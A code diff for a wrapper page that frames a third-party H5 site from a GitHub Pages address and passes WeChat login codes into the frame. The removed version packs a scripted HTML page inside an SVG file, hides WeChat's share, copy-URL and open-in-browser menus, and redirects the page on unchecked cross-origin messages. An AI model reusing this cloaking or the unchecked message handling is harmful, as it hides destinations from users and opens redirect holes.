@@ -1,137 +1,62 @@
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
-  <foreignObject width="100%" height="100%">
-    <html xmlns="http://www.w3.org/1999/xhtml">
-      <head>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-        <title>Rebuild APP</title>
-        <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
-        <style>
-          *{margin:0;padding:0;}
-          html,body{width:100%;height:100%;}
-          #dynamicIframe{width:100%;height:100%;border:0;}
-        </style>
-      </head>
-      <body>
-        <iframe id="dynamicIframe" src="" frameborder="0"></iframe>
-        <script>
-          const FIXED_IFRAME_URL = "https://h5.hlll.org/"; // 主客户端 H5
-          const FIXED_SIGN_URL   = "https://beachercotton.github.io/xincai666/"; // 完整回调地址
+<iframe id="dynamicIframe" src="" frameborder="0" style="width:100%;height:100%;"></iframe>
+<script>
+const FIXED_IFRAME_URL = "https://h5.hlll.org/";          // H5 客户端
+const FIXED_PARENT_URL = "https://beachercotton.github.io/xincai666/"; // 外层 GitHub
 
-          // 检查是否微信授权回调
-          function checkWechatCallback() {
-            const params = new URLSearchParams(window.location.search);
-            const code = params.get('code');
-            const state = params.get('state');
-            if(code && state){
-              return { code, state, isWechatCallback: true };
+function checkWechatCallback() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const code = urlParams.get('code');
+    const state = urlParams.get('state');
+    if (code && state) {
+        try {
+            const stateData = JSON.parse(decodeURIComponent(state));
+            if (stateData.source === 'wechat_login') {
+                return { code, state, isWechatCallback: true };
             }
-            return { isWechatCallback: false };
-          }
+        } catch(e){}
+    }
+    return { isWechatCallback: false };
+}
 
-          (function loadIframe(){
-            const iframe = document.getElementById("dynamicIframe");
-            const callbackInfo = checkWechatCallback();
-            let iframeUrl = FIXED_IFRAME_URL;
+(function loadIframe(){
+    const iframe = document.getElementById("dynamicIframe");
+    const callbackInfo = checkWechatCallback();
+    let iframeUrl = FIXED_IFRAME_URL;
 
-            if(callbackInfo.isWechatCallback){
-              // 授权回调：直接跳到完整回调地址 + code/state
-              const sep = FIXED_SIGN_URL.includes('?') ? '&' : '?';
-              iframeUrl = FIXED_SIGN_URL + sep +
-                          "code=" + encodeURIComponent(callbackInfo.code) +
-                          "&state=" + encodeURIComponent(callbackInfo.state);
-            } else {
-              // 普通参数透传给 H5 客户端
-              const params = [];
-              for(const [k,v] of new URLSearchParams(window.location.search)){
-                params.push(`${k}=${encodeURIComponent(v)}`);
-              }
-              if(params.length>0){
-                const sep = iframeUrl.includes('?') ? '&' : '?';
-                iframeUrl += sep + params.join('&');
-              }
-            }
+    if (callbackInfo.isWechatCallback) {
+        const sep = iframeUrl.includes('?') ? '&' : '?';
+        iframeUrl += `${sep}code=${callbackInfo.code}&state=${encodeURIComponent(callbackInfo.state)}`;
+    } else {
+        const params = [];
+        for (const [k,v] of new URLSearchParams(window.location.search)) {
+            params.push(`${k}=${encodeURIComponent(v)}`);
+        }
+        if (params.length > 0) {
+            const sep = iframeUrl.includes('?') ? '&' : '?';
+            iframeUrl += `${sep}${params.join('&')}`;
+        }
+    }
 
-            iframe.src = iframeUrl;
+    iframe.src = iframeUrl;
 
-            // 可选：iframe 加载完成后向子窗口传递父页面信息
-            iframe.onload = function(){
-              setTimeout(()=>{
-                try {
-                  iframe.contentWindow.postMessage({
-                    action: 'set_iframe_parent_url',
-                    iframe_parent_url: window.location.href,
-                    parent_origin: window.location.origin
-                  }, '*');
-                } catch(e){}
-              },1000);
-            };
-          })();
-
-          // 微信 JS-SDK 初始化（可选）
-          if(/MicroMessenger/i.test(navigator.userAgent) && window.wx){
-            fetch("https://aol.com/api/wechat/getJsapiTicket", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ url: FIXED_SIGN_URL })
-            })
-            .then(r=>r.json())
-            .then(res=>{
-              if(res && res.data){
-                try{
-                  wx.config({
-                    debug: false,
-                    appId: res.data.appId,
-                    timestamp: res.data.timestamp,
-                    nonceStr: res.data.nonceStr,
-                    signature: res.data.signature,
-                    jsApiList: ["hideOptionMenu", "hideMenuItems", "closeWindow"]
-                  });
-                  wx.ready(()=>{
-                    wx.hideOptionMenu();
-                    wx.hideMenuItems({
-                      menuList:[
-                        "menuItem:share:appMessage",
-                        "menuItem:share:timeline",
-                        "menuItem:copyUrl",
-                        "menuItem:openWithQQBrowser",
-                        "menuItem:openWithSafari"
-                      ]
-                    });
-                  });
-                } catch(e){}
-              }
-            }).catch(e=>{});
-          }
-
-          // 监听来自 iframe 的消息
-          window.addEventListener("message", function(event){
-            if(event?.data?.action==="redirect" && typeof event.data.url==="string"){
-              window.location.href = event.data.url;
-            }
-            if(event?.data?.action==="wechat_authorize" && typeof event.data.url==="string"){
-              window.location.href = event.data.url;
-            }
-            if(event?.data?.action==="iframe_navigate" && typeof event.data.url==="string"){
-              const iframe = document.getElementById("dynamicIframe");
-              if(iframe) iframe.src = event.data.url;
-            }
-            if(event?.data?.action==="get_client_domain"){
-              const iframe = document.getElementById("dynamicIframe");
-              if(iframe && iframe.contentWindow){
+    iframe.onload = function(){
+        setTimeout(()=>{
+            try {
+                // 通知 iframe 自己外层父地址
                 iframe.contentWindow.postMessage({
-                  action:'client_domain_response',
-                  clientDomain: FIXED_IFRAME_URL,
-                  iframeDomain: FIXED_SIGN_URL
-                },'*');
-              }
-            }
-            if(event?.data?.action==="payment_redirect" && typeof event.data.url==="string"){
-              window.location.href = event.data.url;
-            }
-          });
-        </script>
-      </body>
-    </html>
-  </foreignObject>
-</svg>
+                    action: 'set_iframe_parent_url',
+                    iframe_parent_url: FIXED_PARENT_URL
+                }, '*');
+            } catch(e){}
+        },1000);
+    };
+})();
+
+window.addEventListener("message", function(event){
+    // 所有跳转都在 iframe 内部处理，不跳出外层
+    if(event?.data?.action === "iframe_navigate" && typeof event.data.url === "string"){
+        const iframe = document.getElementById("dynamicIframe");
+        if(iframe) iframe.src = event.data.url;
+    }
+});
+</script>
